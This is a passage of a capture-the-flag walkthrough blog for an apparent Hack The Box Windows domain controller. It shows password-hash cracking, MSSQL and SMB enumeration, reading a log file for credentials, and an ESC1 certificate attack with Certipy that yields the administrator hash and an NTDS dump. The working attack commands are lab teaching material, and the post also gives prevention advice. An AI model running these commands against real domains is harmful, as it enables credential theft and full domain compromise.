<p><strong>I fire up</strong> <a href="https://www.kali.org/tools/hashcat/">hashcat</a> <strong>and good ol&rsquo; trusty rockyou</strong></p>
<ul>
<li><code>hashcat -m 5600 mssqlhash ~/Wordlists/rockyou.txt</code></li>
<li><figure><img src="/ox-hugo/2024-10-04-115952_.png">
</figure>

<ul>
<li>Cracked!! In theory we should be able to authorize as this DBA, activate <code>xp_cmdshell</code> and get code execution on the underlying OS.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>I verify it&rsquo;s valid</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-04-120456_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h3 id="enumerating-smb-as-sql-svc-user">Enumerating SMB as <code>sql_svc</code> user:</h3>
<ul>
<li>
<p>I check with netexec if the user can connect to SMB and they can, they have access to the <code>SYSVOL</code> share as well as the <code>NETLOGON</code> share.</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-04-121444_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><code>SYSVOL</code> <strong>Share Enumeration</strong>:</p>
<ul>
<li>I use smbmap to enumerate the share but there is nothing of note:
<ul>
<li><code>smbmap -u $user -p $pass -H $box -r SYSVOl</code></li>
<li><figure><img src="/ox-hugo/2024-10-04-122445_.png">
</figure>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><code>NETLOGON</code> <strong>Share Enumeration</strong>:</p>
<ul>
<li><code>smbmap -u $user -p $pass -H $box -r NETLOGON</code></li>
<li><figure><img src="/ox-hugo/2024-10-04-122604_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h4 id="sysvol-share"><code>SYSVOL</code> Share:</h4>
<ul>
<li>Part of the <code>SYSVOL</code> directory is shared as the <code>SYSVOL</code> share; this is critical for distributing files necessary for Group Policy &amp; will often be used to hold scripts on a DC so this is a good target to go after.</li>
</ul>
<h3 id="running-bloodhound-dot-py">Running bloodhound.py:</h3>
<ul>
<li><strong>I use</strong> <code>bloodhound.py</code> <strong>to enumerate the domain with the creds I have</strong>.
<ul>
<li><code>python3 bloodhound.py -dc dc.sequel.htb -c All -u $user -p $pass -d sequel.htb -ns $box</code></li>
<li><figure><img src="/ox-hugo/2024-10-04-122851_.png">
</figure>
</li>
<li>Looking at the results our current user does not have that many privielges so I will continue to enumerate.</li>
</ul>
</li>
</ul>
<h3 id="connecting-to-the-mssql-as-sql-svc">Connecting to the MSSQL as <code>sql_svc</code>:</h3>
<ul>
<li>
<p><strong>I connect to the host as</strong> <code>sql_svx</code>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-04-120929_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>I try and enable</strong> <code>xp_cmdshell</code> <strong>but am unable to</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-04-121124_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h3 id="finding-a-linked-sql-instance">Finding a linked SQL Instance:</h3>
<ul>
<li>
<p>+Correction+: This is wrong, I later found it was just showing me my existing database, I have left it in as I believe it&rsquo;s important and show these mistakes.</p>
</li>
<li>
<p><strong>I check if there are any linked remote SQL instances running</strong>:</p>
<ul>
<li><code>SELECT srvname, isremote FROM sysservers;</code></li>
<li><figure><img src="/ox-hugo/2024-10-04-172538_.png">
</figure>
</li>
<li>We can also run the inbuilt command in <code>impacket-mssql</code>:</li>
<li><code>enum_links</code></li>
<li><figure><img src="/ox-hugo/2024-10-04-172800_.png">
</figure>

<ul>
<li>I try and connect but I am unable to access the instance</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="enumerating-the-host-using-xp-dirtree">Enumerating the Host Using <code>xp_dirtree</code>:</h3>
<ul>
<li>
<p><strong>I check if am able to use</strong> <code>xp_dirtree</code> <strong>to list files on the host</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-04-125627_.png">
</figure>
</li>
<li>Bingo</li>
</ul>
</li>
<li>
<p><strong>I list the users home folders and find a</strong> <code>Ryan.Cooper</code>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-04-125933_.png">
</figure>
</li>
<li>I add his name to my users.</li>
</ul>
</li>
<li>
<p><strong>I try and list his home folder but don&rsquo;t have perms</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-04-130119_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>I enumerate further and find that there is an</strong> <code>ERRORLOG.BAK</code> *file stored in <code>C:\SQLServer\Logs\</code></p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-04-201906_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h3 id="downloading-errorlog-dot-bak-and-why-it-s-important-to-re-check-your-tools">Downloading <code>ERRORLOG.BAK</code> &amp; why it&rsquo;s important to re-check your tools:</h3>
<ul>
<li>
<p><strong>I try and use the</strong> <code>SINGLE_CLOB</code> <strong>approach to read the file but don&rsquo;t have the required permissions</strong>:</p>
<ul>
<li><code>SELECT * FROM OPENROWSET(BULK N'C:\SQLServer\Logs\ERRORLOG.BAK', SINGLE_CLOB) AS Contents</code></li>
<li><figure><img src="/ox-hugo/2024-10-04-202033_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>I try and create a new MSSQL database so I can then import the <code>ERROLOG.BAK</code> into it</strong>:</p>
<ul>
<li><code>CREATE DATABASE hacker;</code></li>
<li><figure><img src="/ox-hugo/2024-10-04-202602_.png">
</figure>
</li>
<li>Denied again.</li>
</ul>
</li>
<li>
<p><strong>Using evil-winrm to retrieve the</strong> <code>ERRORLOG.BAK</code> <strong>file</strong>:</p>
<ul>
<li>I try and connect with <code>evil-winrm</code> which I was convinced I did earlier &amp; couldn&rsquo;t but tried again anyway &amp; could connect!!!
<ul>
<li>Slap me with the idiot gun stick!!!</li>
<li><figure><img src="/ox-hugo/2024-10-04-203935_.png">
</figure>
</li>
<li>+Note+: This is something I want to stress, it&rsquo;s really important to re-check tools in situations like this sometimes you get false positives &amp; false negatives.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="reading-errorlog-dot-bak-and-finding-credentials-for-ryan-dot-cooper">Reading <code>ERRORLOG.BAK</code> &amp; finding credentials for <code>Ryan.Cooper</code>:</h3>
<ul>
<li>
<p><strong>I open the <code>ERRORLOG.BAK</code> in my text editor</strong>:</p>
<ul>
<li>I search for the string &ldquo;password&rdquo; &amp; get a hit containing <code>Ryan.Coopers</code> password:</li>
<li><figure><img src="/ox-hugo/2024-10-04-204115_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>I verify if the creds are still valid using</strong> <code>netexec</code>:</p>
<ul>
<li><code>netexec smb $box -u $user -p $pass --shares</code></li>
<li><figure><img src="/ox-hugo/2024-10-04-204628_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h2 id="3-dot-privilege-escalation">3. Privilege Escalation:</h2>
<h3 id="enumerating-the-host-as-ryan-dot-cooper">Enumerating the host as <code>Ryan.Cooper</code>:</h3>
<ul>
<li>
<p>In this section I am going to show EVERYTHING I do, obviously blogs are cultivated and don&rsquo;t show every little thing, but I want to show all the tools I try to get root.</p>
</li>
<li>
<p><strong>I connect via</strong> <code>evil-winrm</code> <strong>&amp; retrive the flag</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-04-204858_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h4 id="automated-enumeration">Automated Enumeration:</h4>
<ul>
<li>
<p><strong>I check bloodhound</strong>:</p>
<ul>
<li>But there is no clear path here so we need to enumerate the host and the user further:</li>
</ul>
</li>
<li>
<p><strong>I try and run</strong> <code>secretsdump.py</code>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-04-205950_.png">
</figure>
</li>
<li>+Note+: This may seem weird to do now, however I have had success retriveing creds this way and moving laterally.</li>
</ul>
</li>
<li>
<p><strong>Running</strong> <code>LaZagne.exe</code>:</p>
<ul>
<li>We get nothing, will have to try harder…offsec is that you?
<ul>
<li><figure><img src="/ox-hugo/2024-10-04-210426_.png">
</figure>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>I run</strong> <code>SessionGopher.ps1</code> <strong>to check for any other sessions</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-04-210750_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>I run</strong> <code>privesccheck.ps1</code>:</p>
<ul>
<li>I do see that LSA is not protected:
<ul>
<li><figure><img src="/ox-hugo/2024-10-04-211219_.png">
</figure>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="stored-credentials-enumeration">Stored Credentials Enumeration:</h4>
<ul>
<li><strong>Check for stored creds using</strong> <code>cmdkey</code>:
<ul>
<li><code>cmdkey /list</code></li>
<li><figure><img src="/ox-hugo/2024-10-04-211842_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h4 id="user-enumeration">User Enumeration:</h4>
<ul>
<li><strong>I enumerate users</strong>:
<ul>
<li><code>net user</code></li>
<li><figure><img src="/ox-hugo/2024-10-04-214453_.png">
</figure>
</li>
<li>+Note+: The reason my user enumeration is not more extensive is due to the fact that Groups, Users &amp; Hosts are enumerated via bloodhound. My main goal at the moment is to find out what is happening on this specific DC.</li>
</ul>
</li>
</ul>
<h4 id="basic-system-enumeration">Basic System Enumeration:</h4>
<ul>
<li><strong>I try and gather basic</strong> <code>systeminfo</code> <strong>but am denied</strong>:
<ul>
<li><figure><img src="/ox-hugo/2024-10-04-211944_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h4 id="installed-program-enumeration">Installed Program Enumeration:</h4>
<ul>
<li><strong>I list all the installed programs by querying the registry keys using powershell</strong>:







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="#ZgotmplZ">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS C:&gt; (<span style="color:#e6db74">&#39;HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*&#39;</span>, <span style="color:#e6db74">&#39;HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*&#39;</span>) | ForEach-Object { Get-ItemProperty -Path $_ } | Select-Object DisplayName, DisplayVersion, InstallLocation | Format-Table -AutoSize
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>DisplayName                                                        DisplayVersion  InstallLocation
</span></span><span style="display:flex;"><span>-----------                                                        --------------  ---------------
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Microsoft SQL Server <span style="color:#ae81ff">2019</span> (<span style="color:#ae81ff">64</span>-bit)
</span></span><span style="display:flex;"><span>Microsoft SQL Server <span style="color:#ae81ff">2019</span> (<span style="color:#ae81ff">64</span>-bit)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SQL Server <span style="color:#ae81ff">2019</span> Common Files                                       <span style="color:#ae81ff">15.0</span>.2000.5
</span></span><span style="display:flex;"><span>Microsoft SQL Server <span style="color:#ae81ff">2019</span> Setup (English)                          <span style="color:#ae81ff">15.0</span>.4013.40
</span></span><span style="display:flex;"><span>SQL Server <span style="color:#ae81ff">2019</span> XEvent                                             <span style="color:#ae81ff">15.0</span>.2000.5
</span></span><span style="display:flex;"><span>SQL Server <span style="color:#ae81ff">2019</span> XEvent                                             <span style="color:#ae81ff">15.0</span>.2000.5
</span></span><span style="display:flex;"><span>SQL Server <span style="color:#ae81ff">2019</span> SQL Diagnostics                                    <span style="color:#ae81ff">15.0</span>.2000.5
</span></span><span style="display:flex;"><span>Microsoft VSS Writer <span style="color:#66d9ef">for</span> SQL Server <span style="color:#ae81ff">2019</span>                           <span style="color:#ae81ff">15.0</span>.2000.5
</span></span><span style="display:flex;"><span>Microsoft SQL Server <span style="color:#ae81ff">2019</span> T-SQL Language Service                   <span style="color:#ae81ff">15.0</span>.2000.5
</span></span><span style="display:flex;"><span>Microsoft SQL Server <span style="color:#ae81ff">2019</span> RsFx Driver                              <span style="color:#ae81ff">15.0</span>.2000.5
</span></span><span style="display:flex;"><span>SQL Server <span style="color:#ae81ff">2019</span> Common Files                                       <span style="color:#ae81ff">15.0</span>.2000.5
</span></span><span style="display:flex;"><span>SQL Server <span style="color:#ae81ff">2019</span> Database Engine Shared                             <span style="color:#ae81ff">15.0</span>.2000.5
</span></span><span style="display:flex;"><span>SQL Server <span style="color:#ae81ff">2019</span> Shared Management Objects                          <span style="color:#ae81ff">15.0</span>.2000.5
</span></span><span style="display:flex;"><span>Microsoft Visual C++ <span style="color:#ae81ff">2019</span> X64 Minimum Runtime - <span style="color:#ae81ff">14.29</span>.30133        <span style="color:#ae81ff">14.29</span>.30133
</span></span><span style="display:flex;"><span>SQL Server <span style="color:#ae81ff">2019</span> DMF                                                <span style="color:#ae81ff">15.0</span>.2000.5
</span></span><span style="display:flex;"><span>Microsoft ODBC Driver <span style="color:#ae81ff">17</span> <span style="color:#66d9ef">for</span> SQL Server                            <span style="color:#ae81ff">17.7</span>.2.1
</span></span><span style="display:flex;"><span>SQL Server <span style="color:#ae81ff">2019</span> Shared Management Objects Extensions               <span style="color:#ae81ff">15.0</span>.2000.5
</span></span><span style="display:flex;"><span>SQL Server <span style="color:#ae81ff">2019</span> Connection Info                                    <span style="color:#ae81ff">15.0</span>.2000.5
</span></span><span style="display:flex;"><span>Microsoft OLE DB Driver <span style="color:#66d9ef">for</span> SQL Server                             <span style="color:#ae81ff">18.5</span>.0.0
</span></span><span style="display:flex;"><span>Microsoft SQL Server <span style="color:#ae81ff">2012</span> Native Client                            <span style="color:#ae81ff">11.4</span>.7462.6
</span></span><span style="display:flex;"><span>SQL Server <span style="color:#ae81ff">2019</span> Database Engine Services                           <span style="color:#ae81ff">15.0</span>.2000.5
</span></span><span style="display:flex;"><span>SQL Server <span style="color:#ae81ff">2019</span> Shared Management Objects                          <span style="color:#ae81ff">15.0</span>.2000.5
</span></span><span style="display:flex;"><span>SQL Server <span style="color:#ae81ff">2019</span> Shared Management Objects Extensions               <span style="color:#ae81ff">15.0</span>.2000.5
</span></span><span style="display:flex;"><span>VMware Tools                                                       <span style="color:#ae81ff">12.0</span>.6.20104755 C:\Program Files\VMware\VMware Tools\
</span></span><span style="display:flex;"><span>SQL Server <span style="color:#ae81ff">2019</span> Batch Parser                                       <span style="color:#ae81ff">15.0</span>.2000.5
</span></span><span style="display:flex;"><span>SQL Server <span style="color:#ae81ff">2019</span> Database Engine Shared                             <span style="color:#ae81ff">15.0</span>.2000.5
</span></span><span style="display:flex;"><span>SQL Server <span style="color:#ae81ff">2019</span> Database Engine Services                           <span style="color:#ae81ff">15.0</span>.2000.5
</span></span><span style="display:flex;"><span>Microsoft Visual C++ <span style="color:#ae81ff">2019</span> X64 Additional Runtime - <span style="color:#ae81ff">14.29</span>.30133     <span style="color:#ae81ff">14.29</span>.30133
</span></span><span style="display:flex;"><span>SQL Server <span style="color:#ae81ff">2019</span> DMF                                                <span style="color:#ae81ff">15.0</span>.2000.5
</span></span><span style="display:flex;"><span>SQL Server <span style="color:#ae81ff">2019</span> Connection Info                                    <span style="color:#ae81ff">15.0</span>.2000.5
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Microsoft Visual C++ <span style="color:#ae81ff">2015</span>-<span style="color:#ae81ff">2019</span> Redistributable (x64) - <span style="color:#ae81ff">14.29</span>.30133 <span style="color:#ae81ff">14.29</span>.30133.0
</span></span><span style="display:flex;"><span>Microsoft Visual C++ <span style="color:#ae81ff">2015</span>-<span style="color:#ae81ff">2019</span> Redistributable (x86) - <span style="color:#ae81ff">14.29</span>.30133 <span style="color:#ae81ff">14.29</span>.30133.0
</span></span><span style="display:flex;"><span>Microsoft Visual C++ <span style="color:#ae81ff">2019</span> X86 Additional Runtime - <span style="color:#ae81ff">14.29</span>.30133     <span style="color:#ae81ff">14.29</span>.30133
</span></span><span style="display:flex;"><span>Browser <span style="color:#66d9ef">for</span> SQL Server <span style="color:#ae81ff">2019</span>                                        <span style="color:#ae81ff">15.0</span>.2000.5
</span></span><span style="display:flex;"><span>Microsoft Visual C++ <span style="color:#ae81ff">2013</span> x86 Minimum Runtime - <span style="color:#ae81ff">12.0</span>.40664         <span style="color:#ae81ff">12.0</span>.40664
</span></span><span style="display:flex;"><span>Microsoft Visual C++ <span style="color:#ae81ff">2013</span> Redistributable (x86) - <span style="color:#ae81ff">12.0</span>.40664       <span style="color:#ae81ff">12.0</span>.40664.0
</span></span><span style="display:flex;"><span>Microsoft Visual C++ <span style="color:#ae81ff">2013</span> x86 Additional Runtime - <span style="color:#ae81ff">12.0</span>.40664      <span style="color:#ae81ff">12.0</span>.40664
</span></span><span style="display:flex;"><span>Microsoft Visual C++ <span style="color:#ae81ff">2019</span> X86 Minimum Runtime - <span style="color:#ae81ff">14.29</span>.30133        <span style="color:#ae81ff">14.29</span>.<span style="color:#ae81ff">30133</span></span></span></code></pre></div>
    
</div>
</li>
<li>The only thing that looks interesting here is the VMWare install, however that could just be for the box to run.</li>
</ul>
<h4 id="path-enumeration">Path Enumeration:</h4>
<ul>
<li><strong>I enumerate the</strong> <code>PATH</code>:
<ul>
<li><code>$Env:PATH</code>
<ul>
<li>I see that there is an installation of <code>OpenSSH</code> here:
<ul>
<li><figure><img src="/ox-hugo/2024-10-04-213528_.png">
</figure>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="drive-enumeration">Drive Enumeration:</h4>
<ul>
<li><strong>I check for any other mounted drives</strong>:
<ul>
<li><code>get-PSdrive</code></li>
<li><figure><img src="/ox-hugo/2024-10-04-213703_.png">
</figure>
</li>
<li>What is interesting here is <code>Cert</code>, certificates can be used as a valid attack path.</li>
</ul>
</li>
</ul>
<h4 id="scheduled-task-enumeration">Scheduled Task Enumeration:</h4>
<ul>
<li><strong>I check for scheduled tasks</strong>:
<ul>
<li><code>Get-ScheduledTask | select TaskName,State</code></li>
<li><figure><img src="/ox-hugo/2024-10-04-213931_.png">
</figure>
</li>
<li>It is denied, however I can use <code>schtasks</code>, save the output and inspect later:
<ul>
<li><code>schtasks /query /fo LIST /v &gt; tasks.txt</code></li>
<li><figure><img src="/ox-hugo/2024-10-04-214202_.png">
</figure>
</li>
<li>This provides ALOT of data, so we need to be smart with how we process it. At the moment I have kept it for later.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="powershell-history-enumeration">Powershell History Enumeration:</h4>
<ul>
<li><strong>I try and check his powershell history file</strong>:
<ul>
<li><code>Cat C:\Users\Ryan.Cooper\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></li>
<li><code>Get-ChildItem -Path &quot;$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine&quot; | Format-Table -AutoSize</code></li>
</ul>
</li>
</ul>
<h4 id="network-enumeration">Network Enumeration:</h4>
<ul>
<li>
<p><strong>I check to see if we are listening or presenting any interesting services</strong>:</p>
<ul>
<li><code>netstat -nao</code></li>
<li><figure><img src="/ox-hugo/2024-10-05-132616_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>Arp Table Enumeration</strong>:</p>
<ul>
<li><code>arp -a</code></li>
<li><figure><img src="/ox-hugo/2024-10-05-133159_.png">
</figure>
</li>
<li>There are some other hosts listed here, however as far as I am aware this is the only target for this engagement as it&rsquo;s a single box, unless we are presenting different services on different nics &amp; they have seperate IP&rsquo;s.</li>
</ul>
</li>
<li>
<p><strong>NIC enumeration</strong>:</p>
<ul>
<li><code>ipconfig /all</code></li>
<li><figure><img src="/ox-hugo/2024-10-05-133327_.png">
</figure>
</li>
<li>I check for additional NICS but there is nothing, so the entries in the arp table I imagine are part of HTB&rsquo;s infrastructure.</li>
</ul>
</li>
<li>
<p><strong>I check the routing table</strong>:</p>
<ul>
<li><code>route print</code></li>
<li><figure><img src="/ox-hugo/2024-10-05-133517_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>I attempt to enumerate network shares but I am denied</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-05-133615_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>I check for VPN connections</strong>:</p>
<ul>
<li><code>rasdial</code></li>
<li><figure><img src="/ox-hugo/2024-10-05-134610_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h4 id="service-process-enumeration">Service/Process Enumeration:</h4>
<ul>
<li>
<p><strong>I attempt to list all processes running</strong>:</p>
<ul>
<li>I try with <code>tasklist /svc</code> &amp; with <code>wmic process list full</code> but I am denied.</li>
<li><figure><img src="/ox-hugo/2024-10-05-134800_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>I try and enumerate services using powershell</strong>:</p>
<ul>
<li><code>get-service</code></li>
<li><figure><img src="/ox-hugo/2024-10-05-135020_.png">
</figure>
</li>
<li>It fails as I suspect, however we can also check services with <code>evil-winrm</code>.</li>
</ul>
</li>
<li>
<p><strong>Listing running services using</strong> <code>evil-winrm</code>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-05-135154_.png">
</figure>
</li>
<li>There are 3 services running with Privs, but 2 are Defender and the other is a standard windows component, so not hijackable as far as I am aware.</li>
</ul>
</li>
</ul>
<h4 id="enumerating-the-password-policy">Enumerating the password policy:</h4>
<ul>
<li><strong>Enumerating the password policy</strong>:
<ul>
<li><code>net accounts</code></li>
<li><figure><img src="/ox-hugo/2024-10-05-135455_.png">
</figure>
</li>
<li>Nothing of note</li>
</ul>
</li>
</ul>
<h4 id="enumerating-if-the-dc-is-vulnerable-to-any-certificate-privilege-escalation-techniques-dot">Enumerating if the DC is vulnerable to any certificate privilege escalation techniques.</h4>
<ul>
<li>
<p><strong>I use</strong> <a href="https://github.com/ly4k/Certipy">certipy</a> <strong>to check if the DC is vulnerable</strong>:</p>
<ul>
<li><code>certipy-ad find -vulnerable -u $user@$domain -p $pass -dc-ip $box</code></li>
<li><figure><img src="/ox-hugo/2024-10-05-141826_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>Reading the report it says the DC is vulnerable to the</strong> <a href="https://github.com/ly4k/Certipy?tab=readme-ov-file#esc1">ESC1</a> <strong>attack path</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-05-141931_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h3 id="using-esc1-attack-chain-to-elevate-privileges-to-administrator">Using ESC1 Attack Chain to elevate privileges to Administrator:</h3>
<ol>
<li>
<p><strong>I retrieve the certificate template name from the file</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-05-151236_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>I sync my clock</strong>:</p>
<ul>
<li><code>sudo ntpdate -s sequel.htb</code></li>
<li><figure><img src="/ox-hugo/2024-10-05-152616_.png">
</figure>

<ul>
<li>+Note+:
<ul>
<li>If you see the below error this is most likely down to your attack host clock being too out of sync with the target. (Picture taken from a previous box where I learned the hard way)</li>
<li><figure><img src="/ox-hugo/2024-09-21-201233_.png">
</figure>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>I request a cert</strong>:</p>
<ul>
<li><code>certipy-ad req -username $user@$domain -password $pass -ca sequel-DC-CA -target ca.$domain -template UserAuthentication -upn administrator@$domain -dns dc.$domain</code>
<ul>
<li><figure><img src="/ox-hugo/2024-10-05-150245_.png">
</figure>
</li>
<li>+Note+: How we have used the name of the certificate we found in step 1 <code>UserAuthentication</code></li>
<li><del>!!!SUCESS!!!</del></li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>I request to authenticate as the Administrator and retrieve the Administrator NT hash &amp; creds stored in</strong> <code>.ccache</code>:</p>
<ul>
<li><code>certipy-ad auth -pfx administrator_dc.pfx -dc-ip $box</code></li>
<li>We have both the administrator hash as well as the creds stored in <code>.ccache</code> which we can use Kerberos authentication with.</li>
<li><figure><img src="/ox-hugo/2024-10-05-150539_.png">
</figure>
</li>
</ul>
</li>
</ol>
<h4 id="attack-deep-dive-e-dot-g-exploiting-upn-s-in-esc1-attacks-a-hackers-guide">Attack Deep-Dive e.g Exploiting UPN&rsquo;s in ESC1 Attacks: A Hackers Guide:</h4>
<ul>
<li>
<p><strong>What&rsquo;s a UPN and Why Do We Care?</strong></p>
<ul>
<li>First things first: <code>UPN</code> stands for User Principal Name (UPN). They&rsquo;re commonly used when issuing certificates from a Microsoft Certificate Authority (CA) for user authentication. Here&rsquo;s why they&rsquo;re so important:
<ol>
<li>They represent identity in certificates, usually in the Subject Alternative Name (SAN) extension.</li>
<li>They link certificates to specific Active Directory accounts.</li>
<li>They enable certificate mapping for authentication.</li>
<li>They facilitate Single Sign-On (SSO) scenarios.</li>
<li>They&rsquo;re used in smart card logons.</li>
<li>Sometimes, they even correspond to email addresses.</li>
</ol>
</li>
</ul>
</li>
<li>
<p><strong>Now onto the attack</strong>:</p>
<ul>
<li>ESC1 is one of the most fundamental certificate-based attack vectors in Active Directory environments. It occurs when a certificate template allows for client authentication and is configured with dangerous enrollment permissions. Here&rsquo;s why it matters:
<ul>
<li>It&rsquo;s incredibly common in enterprise environments</li>
<li>Often overlooked during security assessments</li>
<li>Can lead to complete domain compromise (like in this case)</li>
<li>Relatively simple to execute</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>The ESC1 Attack: Your Gateway to Domain Admin Privileges</strong>:</p>
<ul>
<li>The ESC1 attack path revolves around a misconfigured certificate template that grants excessive enrollment permissions. Here&rsquo;s the breakdown:
<ol>
<li>We discover a template that allows client authentication (like the User template)</li>
<li>We notice that low-privileged users (like Domain Users) have enrollment rights</li>
<li>We request a certificate using this template</li>
<li>We can now authenticate to services that accept certificate-based authentication</li>
</ol>
</li>
</ul>
</li>
<li>
<p><strong>From Certificate to Domain Access</strong>:</p>
<ul>
<li>But wait, you might ask, &ldquo;How do we actually leverage this certificate for privilege escalation?&rdquo; Great question! Here&rsquo;s the step-by-step process:
<ul>
<li>
<p>First, we identify vulnerable templates:</p>
<ul>
<li>Look for templates that allow client authentication</li>
<li>Check if Domain Users can enroll</li>
<li>Verify the template is enabled</li>
</ul>
</li>
<li>
<p><strong>We request and obtain our certificate</strong>:</p>
<ul>
<li>Using Certipy</li>
<li>The certificate is valid and trusted within the domain</li>
</ul>
</li>
<li>
<p><strong>Here&rsquo;s where the magic happens</strong>:</p>
<ul>
<li>We can now authenticate to services that accept certificate auth</li>
<li>+Note+: Certipy extracts this the admin hash from TGT and presents us with it as well as saving the TGT as a <code>.cacche</code> file so we can then perform PTT attacks from the comfort of our attack box.</li>
</ul>
</li>
<li>
<p><strong>Privilege escalation opportunities</strong>:</p>
<ul>
<li>Authenticate as a the privielged user with their hash.</li>
<li>Authentication to sensitive services</li>
<li>Potential for further certificate template abuse</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Why This Attack Vector is Significant</strong>:</p>
<ul>
<li><strong>Widespread Impact</strong>: Many organizations use default certificate templates</li>
<li><strong>Persistence</strong>: Certificates typically have long validity periods
<ul>
<li><figure><img src="/ox-hugo/2024-10-05-153645_.png">
</figure>
</li>
<li>This one is valide for 99 years!!!</li>
</ul>
</li>
<li><strong>Stealth Factor</strong>: Certificate-based authentication generates fewer logs</li>
<li><strong>Chain Reaction</strong>: Can be combined with other ESC attacks for greater impact</li>
</ul>
</li>
<li>
<p><strong>Detection and Prevention</strong>:</p>
<ol>
<li>Audit certificate template permissions regularly</li>
<li>Restrict enrollment rights to necessary users only</li>
<li>Disable unused certificate templates</li>
<li>Monitor certificate request patterns</li>
<li>Implement proper template security settings</li>
</ol>
</li>
<li>
<p><strong>Tools of the Trade</strong>:</p>
<ul>
<li><a href="https://github.com/ly4k/Certipy?tab=readme-ov-file#esc1">Certipy</a>: Your Swiss Army knife for certificate attacks</li>
<li><a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil">Certutil</a>: Built-in Windows tool for certificate operations</li>
</ul>
</li>
<li>
<p><strong>Remember</strong>: ESC1 might seem basic, but it&rsquo;s often the first step in a more complex attack chain. Don&rsquo;t underestimate its potential impact on your Active Directory security posture!</p>
</li>
</ul>
<h2 id="4-dot-ownership">4. Ownership:</h2>
<h3 id="dumping-ntds-dot-dit-database">Dumping <code>NTDS.dit</code> database:</h3>
<ul>
<li><strong>Dumping NTDS for ownership</strong>:
<ul>
<li><code>netexec smb $box -u $user -H $hash -M ntdsutil</code></li>
<li><figure><img src="/ox-hugo/2024-10-05-151008_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h3 id="loading-dot-ccache-into-the-krb5ccname-variable-to-authenticate">Loading <code>.ccache</code> into the <code>KRB5CCNAME</code> Variable to Authenticate:</h3>
<ul>
<li>
<p><strong>I load the</strong> <code>.ccache</code> <strong>into the</strong> <code>KRB5CCNAME</code> <strong>Variable</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-05-154134_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>I check it&rsquo;s valid</strong>:</p>
<ul>
<li><code>netexec smb $box -u administrator --use-kcache --shares</code></li>
<li><figure><img src="/ox-hugo/2024-10-05-154254_.png">
</figure>
</li>
<li>It is, we can now authenticate with kerberos.</li>
</ul>
</li>
</ul>
<h2 id="lessons-learned">Lessons Learned:</h2>
<h3 id="what-did-i-learn">What did I learn?</h3>
<ol>
<li>I hadn&rsquo;t actually used the ESC1 attack vector before only ESC7 in <a href="https://bloodstiller.com/walkthroughs/manager-box/">https://bloodstiller.com/walkthroughs/manager-box/</a>, so it was cool to that.</li>
